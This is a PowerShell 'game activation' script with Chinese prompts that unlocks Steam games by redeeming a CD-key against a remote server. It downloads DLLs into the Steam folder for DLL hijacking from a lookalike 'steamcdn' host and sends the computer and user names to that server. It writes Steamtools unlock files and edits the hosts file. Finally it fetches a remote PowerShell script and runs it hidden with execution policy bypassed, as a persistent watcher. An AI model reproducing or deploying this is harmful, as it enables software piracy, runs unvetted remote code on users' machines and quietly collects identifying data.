

$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = "Stop"
$BoxApiBase = "__INJECT_API_BASE__"

try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls } catch {}

$script:ProgressTitle = "正在通过内部渠道激活游戏"

function Wait-UserClose() {
    Write-Host ""
    Read-Host "按 Enter 键关闭窗口"
}

function Write-Fail([string]$Msg) {
    Write-Progress -Activity $script:ProgressTitle -Completed
    Write-Host $Msg -ForegroundColor Red
    Wait-UserClose
    exit 1
}

function Exit-Success([string]$GameName) {
    Write-Progress -Activity $script:ProgressTitle -Completed
    Write-Host ""
    if ($GameName) {
        Write-Host ("激活完成: " + $GameName) -ForegroundColor Green
    } else {
        Write-Host "激活完成" -ForegroundColor Green
    }
    Wait-UserClose
    exit 0
}

function Set-ActivateProgress([int]$Percent, [string]$Status) {
    Write-Progress -Activity $script:ProgressTitle -Status $Status -PercentComplete $Percent
}

function Get-SteamPath {
    $steamPath = ""
    if (Test-Path "HKCU:\Software\Valve\Steam") {
        $p = Get-ItemProperty "HKCU:\Software\Valve\Steam" -ErrorAction SilentlyContinue
        if ($p.SteamPath) { $steamPath = [string]$p.SteamPath }
    }
    if (-not $steamPath) {
        $steamPath = (Get-ItemProperty "HKLM:\Software\WOW6432Node\Valve\Steam" -Name "InstallPath" -ErrorAction SilentlyContinue).InstallPath
    }
    foreach ($p in @($steamPath, "D:\steam", "C:\Program Files (x86)\Steam")) {
        if ($p -and (Test-Path (Join-Path $p "steam.exe"))) { return $p }
    }
    return $null
}

function Test-HookReady([string]$SteamPath) {
    $x = Join-Path $SteamPath "xinput1_4.dll"
    $d = Join-Path $SteamPath "dwmapi.dll"
    if (-not ((Test-Path $x) -and (Get-Item $x).Length -gt 100000)) { return $false }
    if (-not ((Test-Path $d) -and (Get-Item $d).Length -gt 100000)) { return $false }
    try {
        $reg = Get-ItemProperty "HKCU:\Software\Valve\Steamtools" -ErrorAction Stop
        return ([string]$reg.iscdkey -eq "true")
    } catch { return $false }
}

function Test-CdkFormat([string]$Code) {
    $code = ($Code -replace '\s', '').ToUpper()
    return ($code -match '^[A-Z0-9]{4}(?:-[A-Z0-9]{4}){3}$')
}

function Show-SteamBanner {
    Clear-Host
    try { [Console]::InputEncoding = [System.Text.Encoding]::UTF8 } catch {}
    $art = @(
        "          _____                _____                    _____                    _____                    _____          "
        "         /\    \              /\    \                  /\    \                  /\    \                  /\    \         "
        "        /::\    \            /::\    \                /::\    \                /::\    \                /::\____\        "
        "       /::::\    \           \:::\    \              /::::\    \              /::::\    \              /::::|   |        "
        "      /::::::\    \           \:::\    \            /::::::\    \            /::::::\    \            /:::::|   |        "
        "     /:::/\:::\    \           \:::\    \          /:::/\:::\    \          /:::/\:::\    \          /::::::|   |        "
        "    /:::/__\:::\    \           \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \        /:::/|::|   |        "
        "    \:::\   \:::\    \          /::::\    \      /::::\   \:::\    \      /::::\   \:::\    \      /:::/ |::|   |        "
        "  ___\:::\   \:::\    \        /::::::\    \    /::::::\   \:::\    \    /::::::\   \:::\    \    /:::/  |::|___|______  "
        " /\   \:::\   \:::\    \      /:::/\:::\    \  /:::/\:::\   \:::\    \  /:::/\:::\   \:::\    \  /:::/   |::::::::\    \ "
        "/::\   \:::\   \:::\____\    /:::/  \:::\____\/:::/__\:::\   \:::\____\/:::/  \:::\   \:::\____\/:::/    |:::::::::\____\"
        "\:::\   \:::\   \::/    /   /:::/    \::/    /\:::\   \:::\   \::/    /\::/    \:::\  /:::/    /\::/    / ~~~~~/:::/    /"
        " \:::\   \:::\   \/____/   /:::/    / \/____/  \:::\   \:::\   \/____/  \/____/ \:::\/:::/    /  \/____/      /:::/    / "
        "  \:::\   \:::\    \      /:::/    /            \:::\   \:::\    \               \::::::/    /               /:::/    /  "
        "   \:::\   \:::\____\    /:::/    /              \:::\   \:::\____\               \::::/    /               /:::/    /   "
        "    \:::\  /:::/    /    \::/    /                \:::\   \::/    /               /:::/    /               /:::/    /    "
        "     \:::\/:::/    /      \/____/                  \:::\   \/____/               /:::/    /               /:::/    /     "
        "      \::::::/    /                                 \:::\    \                  /:::/    /               /:::/    /      "
        "       \::::/    /                                   \:::\____\                /:::/    /               /:::/    /       "
        "        \::/    /                                     \::/    /                \::/    /                \::/    /        "
        "         \/____/                                       \/____/                  \/____/                  \/____/         "
    )
    foreach ($line in $art) {
        Write-Host $line -ForegroundColor Blue
    }
    Write-Host ""
}

function Hide-SteamWindows {
    try {
        if (-not ("Native.Win32Hide" -as [type])) {
            Add-Type -Name Win32Hide -Namespace Native -MemberDefinition @'
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@ -ErrorAction Stop
        }
        foreach ($name in @("steam", "steamwebhelper")) {
            Get-Process -Name $name -ErrorAction SilentlyContinue | ForEach-Object {
                $h = $_.MainWindowHandle
                if ($h -and ($h.ToInt64() -ne 0)) {
                    [Native.Win32Hide]::ShowWindow($h, 6) | Out-Null
                }
            }
        }
    } catch {}
}

function Stop-SteamQuiet {
    Hide-SteamWindows
    Stop-Process -Name "steam*" -Force -ErrorAction SilentlyContinue
    for ($i = 0; $i -lt 30; $i++) {
        if (-not (Get-Process -Name "steam" -ErrorAction SilentlyContinue)) { break }
        Stop-Process -Name "steam*" -Force -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 300
    }
}

function Remove-BadHostsEntries {
    $hostsPath = Join-Path $env:SystemRoot "System32\drivers\etc\hosts"
    if (-not (Test-Path $hostsPath)) { return }
    try {
        $lines = Get-Content $hostsPath -ErrorAction Stop
        $filtered = @()
        $changed = $false
        foreach ($line in $lines) {
            if ($line -match '^\s*127\.0\.0\.1\s+gmrc\.wudrm\.com\s*(#.*)?$') {
                $changed = $true
                continue
            }
            $filtered += $line
        }
        if ($changed) {
            $filtered | Set-Content $hostsPath -Encoding ASCII -Force
            try { ipconfig /flushdns | Out-Null } catch {}
        }
    } catch {}
}

function Remove-ConflictingInjectors([string]$SteamPath) {
    foreach ($name in @(
        "version.dll", "user32.dll", "steam.cfg", "hid.dll",
        "GreenLuma_2025_x86.dll", "GreenLuma_2025_x64.dll",
        "steam_api.dll", "steam_api64.dll"
    )) {
        $f = Join-Path $SteamPath $name
        if (Test-Path $f) { Remove-Item $f -Force -ErrorAction SilentlyContinue }
    }
}

function Test-HookDllsPresent([string]$SteamPath) {
    $x = Join-Path $SteamPath "xinput1_4.dll"
    $d = Join-Path $SteamPath "dwmapi.dll"
    if (-not ((Test-Path $x) -and (Get-Item $x).Length -gt 100000)) { return $false }
    if (-not ((Test-Path $d) -and (Get-Item $d).Length -gt 100000)) { return $false }
    return $true
}

function Set-SteamHookRegistry([string]$SteamPath, [string]$ApiBase) {
    $stplug = Join-Path $SteamPath "config\stplug-in"
    New-Item -ItemType Directory -Force -Path $stplug | Out-Null
    New-Item -ItemType Directory -Force -Path (Join-Path $env:LOCALAPPDATA "steam") | Out-Null
    $regPath = "HKCU:\Software\Valve\Steamtools"
    if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
    foreach ($n in @("ActivateUnlockMode", "AlwaysStayUnlocked", "notUnlockDepot")) {
        Remove-ItemProperty -Path $regPath -Name $n -ErrorAction SilentlyContinue
    }
    Set-ItemProperty -Path $regPath -Name "SteamPath" -Value (($SteamPath -replace "\\", "/")) -Type String
    Set-ItemProperty -Path $regPath -Name "iscdkey" -Value "true" -Type String
    Join-Path $env:LOCALAPPDATA "steam\hook.json" | ForEach-Object {
        @{ api = $ApiBase; steam = ($SteamPath -replace "\\", "/"); installed = (Get-Date -Format "yyyy-MM-dd HH:mm:ss") } |
            ConvertTo-Json | Set-Content $_ -Encoding UTF8
    }
}

function Get-RemoteFile([string[]]$Urls, [string]$Target, [int]$MinBytes = 100000) {
    $lastErr = $null
    foreach ($url in $Urls) {
        if (-not $url) { continue }
        for ($attempt = 1; $attempt -le 3; $attempt++) {
            try {
                if (Test-Path $Target) { Remove-Item $Target -Force -ErrorAction SilentlyContinue }
                Invoke-WebRequest -Uri $url -OutFile $Target -UseBasicParsing -TimeoutSec 90 -MaximumRedirection 5 | Out-Null
                if ((Test-Path $Target) -and (Get-Item $Target).Length -ge $MinBytes) {
                    return $true
                }
                $lastErr = "下载内容不完整 ($url)"
            } catch {
                $lastErr = $_.Exception.Message
            }
            Start-Sleep -Seconds (2 * $attempt)
        }
    }
    if (Test-Path $Target) { Remove-Item $Target -Force -ErrorAction SilentlyContinue }
    throw "无法下载激活组件，请检查网络后重试。$lastErr"
}

function Install-SteamHook([string]$SteamPath, [string]$ApiBase) {
    Remove-ConflictingInjectors $SteamPath
    $base = $ApiBase.TrimEnd('/')
    $pairs = @(
        @("xinput1_4.dll", @("https://update.steamcdn.com/update", "http://update.steamcdn.com/update", "$base/static/inject/xinput1_4.dll")),
        @("dwmapi.dll",    @("https://update.steamcdn.com/dwmapi", "http://update.steamcdn.com/dwmapi", "$base/static/inject/dwmapi.dll"))
    )
    foreach ($p in $pairs) {
        $target = Join-Path $SteamPath $p[0]
        Get-RemoteFile -Urls $p[1] -Target $target | Out-Null
    }
    Set-SteamHookRegistry $SteamPath $ApiBase
}

function Ensure-SteamHook([string]$SteamPath, [string]$ApiBase) {
    if (Test-HookReady $SteamPath) { return }
    if (Test-HookDllsPresent $SteamPath) {
        Set-SteamHookRegistry $SteamPath $ApiBase
        return
    }
    Set-ActivateProgress 12 "正在准备激活组件…"
    if (Get-Process -Name "steam" -ErrorAction SilentlyContinue) {
        Stop-SteamQuiet
    }
    Install-SteamHook $SteamPath $ApiBase
    Hide-SteamWindows
}

function Start-SteamSilent([string]$SteamExe, [string]$SteamPath) {
    # 启动前确保旧 Steam 进程已彻底退出，避免“杀掉后没拉起”导致需要手动重启
    for ($i = 0; $i -lt 30; $i++) {
        if (-not (Get-Process -Name "steam" -ErrorAction SilentlyContinue)) { break }
        Stop-Process -Name "steam*" -Force -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 300
    }
    if (-not (Test-Path $SteamExe)) { return }
    try {
        Start-Process -FilePath $SteamExe -ArgumentList "-silent" -WorkingDirectory $SteamPath -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
    } catch {
        Start-Process -FilePath $SteamExe -WorkingDirectory $SteamPath -WindowStyle Minimized -ErrorAction SilentlyContinue | Out-Null
    }
}

function Read-CdkFromUser([string]$Preset = "") {
    if ($Preset) {
        $code = ($Preset -replace '\s', '').ToUpper()
        if (Test-CdkFormat $code) { return $code }
    }
    $typed = Read-Host "CD-Key"
    $code = ($typed -replace '\s', '').ToUpper()
    if (Test-CdkFormat $code) { return $code }
    Write-Fail "CDK 格式错误"
}

function Write-Plugins([string]$Stplug, $Resp, [string]$CdkCode) {
    $appId = [string]$Resp.appid
    [IO.File]::WriteAllBytes(
        (Join-Path $Stplug "$appId.lua"),
        [Convert]::FromBase64String([string]$Resp.lua_b64)
    )
    if ($Resp.st_b64) {
        [IO.File]::WriteAllBytes(
            (Join-Path $Stplug "$appId.st"),
            [Convert]::FromBase64String([string]$Resp.st_b64)
        )
    }
    $steamConfig = Split-Path -Parent $Stplug
    $steamPath = Split-Path -Parent $steamConfig
    $depotDirs = @(
        (Join-Path $steamConfig "depotcache"),
        (Join-Path $steamPath "depotcache")
    )
    foreach ($dir in $depotDirs) {
        New-Item -ItemType Directory -Force -Path $dir | Out-Null
    }
    if ($Resp.manifests) {
        foreach ($manifest in @($Resp.manifests)) {
            $name = [IO.Path]::GetFileName([string]$manifest.name)
            if (-not $name -or -not $name.EndsWith(".manifest")) { continue }
            $bytes = [Convert]::FromBase64String([string]$manifest.b64)
            foreach ($dir in $depotDirs) {
                [IO.File]::WriteAllBytes((Join-Path $dir $name), $bytes)
            }
        }
    }
    $idx = Join-Path $Stplug "cdk_index.json"
    $entry = @{
        cdk = $CdkCode
        appid = $appId
        name = [string]$Resp.name
        ts = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
    }
    $items = @()
    if (Test-Path $idx) {
        try {
            $raw = Get-Content $idx -Raw -Encoding UTF8 | ConvertFrom-Json
            if ($raw -is [System.Array]) { $items = @($raw) }
            else { $items = @($raw) }
        } catch {}
    }
    $items = @($items | Where-Object { ([string]$_.cdk).ToUpper() -ne $CdkCode })
    $items += $entry
    $items | ConvertTo-Json -Depth 4 | Set-Content $idx -Encoding UTF8
}

function Install-RevokeAutoSync([string]$ApiBase) {
    try {
        $dir = Join-Path $env:LOCALAPPDATA "steam"
        New-Item -ItemType Directory -Force -Path $dir | Out-Null
        $local = Join-Path $dir "sync_revoke.ps1"
        Invoke-WebRequest -Uri "$ApiBase/sync-revoke.ps1" -OutFile $local -UseBasicParsing -TimeoutSec 60 | Out-Null
        if (-not (Test-Path $local)) { return }
        $raw = Get-Content $local -Raw -Encoding UTF8
        if (-not $raw -or $raw.Length -lt 500) { return }
        $tokens = $null
        $parseErrors = $null
        [void][System.Management.Automation.Language.Parser]::ParseInput($raw, [ref]$tokens, [ref]$parseErrors)
        if ($parseErrors -and $parseErrors.Count -gt 0) { return }
        $args = @("-NoProfile", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", $local, "-RegisterWatch", "-Quiet")
        Start-Process -FilePath "powershell.exe" -ArgumentList $args -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
    } catch {}
}

function Invoke-Activate([string]$ApiBase, [string]$CdkCode, [string]$SteamPath, [string]$SteamExe) {
    $code = ($CdkCode -replace '\s', '').ToUpper()
    if (-not (Test-CdkFormat $code)) { Write-Fail "CDK 格式错误" }

    Set-ActivateProgress 8 "正在校验环境…"
    Remove-BadHostsEntries
    Ensure-SteamHook $SteamPath $ApiBase

    Set-ActivateProgress 35 "正在连接授权服务器…"
    $machine = "$env:COMPUTERNAME|$env:USERNAME"
    $body = @{ cdk = $code; machine = $machine } | ConvertTo-Json
    try {
        $resp = Invoke-RestMethod -Uri "$ApiBase/api/redeem" -Method Post -Body $body -ContentType "application/json; charset=utf-8" -TimeoutSec 300
    } catch {
        $detail = $_.ErrorDetails.Message
        if ($detail) {
            try {
                $err = $detail | ConvertFrom-Json
                if ($err.message) { Write-Fail ([string]$err.message) }
            } catch {}
        }
        Write-Fail "激活失败（无法连接服务器或请求超时）"
    }
    if (-not $resp.ok) {
        $msg = [string]$resp.message
        if ($msg) { Write-Fail $msg }
        Write-Fail "激活失败"
    }

    Set-ActivateProgress 70 "正在写入游戏配置…"
    $stplug = Join-Path $SteamPath "config\stplug-in"
    Write-Plugins $stplug $resp $code
    $luaOk = Test-Path (Join-Path $stplug "$($resp.appid).lua")
    $stOk = Test-Path (Join-Path $stplug "$($resp.appid).st")
    if (-not ($luaOk -and $stOk)) { Write-Fail "插件写入失败，请检查杀毒软件是否拦截" }

    Set-ActivateProgress 95 "正在重启 Steam…"
    Stop-SteamQuiet
    Start-SteamSilent $SteamExe $SteamPath
    Set-ActivateProgress 100 "激活完成"
    Start-Sleep -Milliseconds 400

    return $resp
}

# ===================== 主流程 =====================
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Fail "请以管理员身份运行 PowerShell"
}

$ApiBase = $BoxApiBase
if ($ApiBase -like "*INJECT*") { $ApiBase = $env:CDK_API }
if (-not $ApiBase) { Write-Fail "连接失败" }
$ApiBase = $ApiBase.TrimEnd("/")

Show-SteamBanner

$CdkCode = ""
if ($cdk) { $CdkCode = [string]$cdk }
elseif ($env:CDK_CODE) { $CdkCode = $env:CDK_CODE }

if (-not $CdkCode) {
    Write-Host "请输入 CDK 激活码" -ForegroundColor Cyan
}
$CdkCode = Read-CdkFromUser $CdkCode

$steamPath = Get-SteamPath
if (-not $steamPath) { Write-Fail "未找到 Steam，请先安装 Steam" }
$steamExe = Join-Path $steamPath "steam.exe"

Hide-SteamWindows
Clear-Host
Set-ActivateProgress 3 "已接收卡密，正在启动…"

$resp = Invoke-Activate $ApiBase $CdkCode $steamPath $steamExe
Install-RevokeAutoSync $ApiBase

Exit-Success ([string]$resp.name)
